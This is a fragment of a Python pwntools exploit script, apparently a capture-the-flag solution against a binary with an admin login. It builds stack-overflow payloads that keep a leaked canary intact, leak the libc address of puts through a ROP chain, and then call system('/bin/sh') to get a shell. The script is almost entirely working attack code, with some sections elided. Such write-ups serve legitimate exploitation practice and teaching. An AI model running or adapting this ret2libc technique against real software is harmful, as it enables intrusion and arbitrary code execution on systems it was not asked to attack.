...
USER = "admin\n"
PASSWORD = b'1\n'
INFO1 = "Enter admin name:"
INFO2 = "Enter admin password:"
LIMIT = ''
POP_RDI_RET = 0x00000000004016ee
...
def build_leak():
    ...
    pd = b'@'*(OFF-0x10)
    pd += flat(canary,0)
    pd += flat(RET,RET,POP_RDI_RET,elf.got['puts'],elf.plt['puts'],0x40174C)
    return pd
...
def build_rop():
    ...
    pd = b'a'*(OFF-0x10)
    pd += flat(canary,0)
    pd += flat(RET,lib + next(libc.search(asm('pop rdi; ret'))),lib + next(libc.search("/bin/sh")),lib + libc.sym['system'])
    return pd
def leak():
    global LIMIT
    rt("The correct password is: ")
    LIMIT = io.recvline().strip()
    print(LIMIT.decode())

def leak2():
    global lib
    lib = ru(6) - libc.sym['puts']
    pr(lib)
...
def move():
    for x in [b'\x1b[C', b'\x1b[C', b'\x1b[C', b'\x1b[A', b'\x1b[D', b'\x1b[B']:
        io.send(x)
        sleep(0.2)
